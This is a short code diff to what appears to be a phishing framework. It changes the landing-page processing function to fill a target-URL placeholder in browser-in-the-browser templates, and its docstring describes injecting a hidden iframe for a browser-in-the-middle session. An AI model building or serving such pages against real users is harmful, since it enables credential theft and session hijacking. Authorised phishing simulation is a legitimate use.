@@ -1,5 +1,6 @@
 from bs4 import BeautifulSoup
 from pathlib import Path
+import json
 import logging
 import os
 
@@ -138,22 +139,33 @@ BITM_CONTROLLER_JS = """
 """
 
 
-def process_landing_page(html_content: str, campaign_id: str) -> str:
+def process_landing_page(
+    html_content: str,
+    campaign_id: str,
+    target_url: str | None = None,
+) -> str:
     """
     Process landing page HTML by injecting:
     1. Hidden iframe for BitM session
     2. Controller JavaScript (show/hide management)
     3. index.js script tag (external file)
+    4. Template variable replacement (TARGET_URL)
 
     Args:
         html_content: Raw HTML content of landing page
         campaign_id: Campaign ID for logging/tracking
+        target_url: Target URL for BitB templates (replaces {{TARGET_URL}})
 
     Returns:
         Processed HTML ready to serve
     """
 
     try:
+        # Replace template variables for BitB templates
+        # Use json.dumps to properly escape for JavaScript string context
+        if target_url:
+            html_content = html_content.replace("{{TARGET_URL}}", json.dumps(target_url))
+
         soup = BeautifulSoup(html_content, 'html.parser')
         head = soup.find('head')
         body = soup.find('body')
